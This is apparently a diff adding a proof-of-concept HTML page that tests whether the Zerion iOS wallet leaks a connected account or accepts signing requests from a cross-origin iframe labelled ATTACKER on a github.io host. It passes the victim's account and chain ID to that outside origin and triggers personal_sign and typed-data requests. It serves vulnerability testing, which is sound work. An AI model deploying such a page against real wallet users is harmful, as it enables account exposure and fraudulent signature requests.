@@ -1,0 +1,40 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zerion iOS cross-origin test</title>
+<style>body{max-width:720px;margin:24px auto;padding:0 16px;font:16px/1.45 system-ui;color:#111;background:#fff}button{width:100%;margin:6px 0;padding:13px;text-align:left;font:600 15px system-ui;background:#fff;border:2px solid #222;border-radius:6px}button:disabled{opacity:.45}pre{white-space:pre-wrap;overflow-wrap:anywhere;border:2px solid #555;padding:12px;font:13px/1.4 ui-monospace,monospace}.verdict{border:3px solid #8b0018;padding:12px;font-weight:800}iframe{width:100%;height:55px;border:1px solid #888}</style>
+<h2>Zerion Wallet iOS — cross-origin authorization</h2>
+<p>Use a burner account. Reject every signing request.</p>
+<button id="connect">1. Connect Origin A</button>
+<button id="accounts" disabled>2. B reads eth_accounts</button>
+<button id="personal" disabled>3. B requests personal_sign using A account — REJECT</button>
+<button id="typed" disabled>4. B requests typed data using A account — REJECT</button>
+<p id="verdict" class="verdict">Waiting for cross-origin B…</p>
+<pre id="log"></pre>
+<iframe id="child" title="Cross-origin B"></iframe>
+<script>
+'use strict';
+const ATTACKER='https://azza1231.github.io/pocpoc/z-atck.html';
+const child=document.querySelector('#child'),bOrigin=new URL(ATTACKER).origin,$=s=>document.querySelector(s);
+let account='',chainId='',ready=false,childProvider='none';
+function out(v){$('#log').textContent+=`${v}\n`}
+function provider(){return window.zerionWallet?.ethereum||window.zerionWallet||window.ethereum?.providers?.find(p=>p?.isZerion)||window.ethereum}
+function send(type){child.contentWindow.postMessage({type,account,chainId},bOrigin)}
+addEventListener('message',e=>{
+  if(e.source!==child.contentWindow||e.origin!==bOrigin)return;
+  const d=e.data||{};
+  if(d.type==='READY'){
+    ready=d.actualOrigin===bOrigin&&d.victimOrigin===location.origin&&d.isSubframe===true;childProvider=d.provider;
+    $('#verdict').textContent=d.provider==='none'?'SECURE/NOT REACHABLE: Zerion provider is absent in cross-origin iframe.':ready?`B authenticated: ${e.origin}; provider in B: ${d.provider}`:'Invalid child proof';
+    $('#accounts').disabled=!ready||!account||childProvider==='none';$('#personal').disabled=!ready||!account||childProvider==='none';$('#typed').disabled=!ready||!account||childProvider==='none';
+  }
+  if(d.type==='RESULT'){
+    out(`${d.test}\n${JSON.stringify(d,null,2)}\n`);
+    if(d.test==='eth_accounts')$('#verdict').textContent=(d.value||[]).some(a=>a.toLowerCase()===account.toLowerCase())?'VULNERABLE: B obtained A account.':'NEGATIVE CONTROL PASSED: B did not obtain A account.';
+    if(d.test==='personal_sign'||d.test==='eth_signTypedData_v4')$('#verdict').textContent=d.error?.code===4001?'PROMPT REACHED: verify requester shown by Zerion. A = vulnerable; B = secure.':/unauthor|connect|permission/i.test(d.error?.message||'')?'SECURE FOR THIS PATH: B was rejected before approval UI.':'Review result; never approve a signing request.';
+  }
+});
+const u=new URL(ATTACKER);u.searchParams.set('victimOrigin',location.origin);u.searchParams.set('v',Date.now());child.src=u;
+$('#connect').onclick=async()=>{try{const p=provider();if(!p?.request)throw Error('Zerion EIP-1193 provider not found');account=(await p.request({method:'eth_requestAccounts'}))?.[0]||'';chainId=await p.request({method:'eth_chainId'});if(!/^0x[0-9a-fA-F]{40}$/.test(account))throw Error('No EVM account');out(`A connected\naccount: ${account}\nchainId: ${chainId}\n`);$('#connect').disabled=true;$('#accounts').disabled=!ready||childProvider==='none';$('#personal').disabled=!ready||childProvider==='none';$('#typed').disabled=!ready||childProvider==='none'}catch(e){out(`CONNECT ERROR: ${e.message}`)}};
+$('#accounts').onclick=()=>send('ACCOUNTS');$('#personal').onclick=()=>send('PERSONAL');$('#typed').onclick=()=>send('TYPED');
+</script>
